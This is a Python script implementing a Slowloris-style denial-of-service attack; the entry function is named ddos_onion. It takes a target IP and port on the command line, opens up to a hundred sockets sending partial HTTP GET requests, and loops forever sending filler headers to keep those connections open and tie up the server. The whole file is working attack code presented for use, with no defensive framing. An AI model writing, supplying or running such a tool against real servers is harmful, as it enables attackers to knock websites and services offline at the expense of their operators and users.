import socket
import ssl
import random
import logging
from argparse import ArgumentParser
import time

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/5.3",
    # Add more user agents as needed
]

DEFAULT_SOCK_TIMEOUT = 4

def generate_fake_identity():
    return "Anonymous"

def send_line(s, line, identity):
    line = f"{line}\r\n"
    s.send(line.encode("utf-8"))
    s.send(f"X-Identity: {identity}\r\n".encode("utf-8"))

def init_socket(ip: str, port, identity):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(DEFAULT_SOCK_TIMEOUT)

    s.connect((ip, port))

    send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1", identity)

    ua = DEFAULT_USER_AGENTS[0]
    send_line(s, f"User-Agent: {ua}", identity)
    send_line(s, "Accept-language: en-US,en,q=0.5", identity)

    return s

def slowloris_iteration(list_of_sockets):
    logging.debug("Sending keep-alive headers...")

    identity = generate_fake_identity()

    for s in list(list_of_sockets):
        try:
            send_line(s, f"X-a: {random.randint(1, 5000)}", identity)
        except socket.error:
            list_of_sockets.remove(s)

    # Sleep for a random amount of time to slow down the attack
    sleep_time = random.randint(1, 5)
    logging.debug("Sleeping for %s seconds...", sleep_time)
    time.sleep(sleep_time)

def ddos_onion():
    logging.basicConfig(level=logging.DEBUG)

    parser = ArgumentParser()
    parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-c", "--connections", type=int, default=100, help="Number of initial connections")
    args = parser.parse_args()

    target_ip = args.target
    target_port = args.port
    num_connections = args.connections

    list_of_sockets = []

    for _ in range(num_connections):  # Number of initial connections
        try:
            s = init_socket(target_ip, target_port, generate_fake_identity())
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)
            break

    while True:
        slowloris_iteration(list_of_sockets)

if __name__ == "__main__":
    ddos_onion()
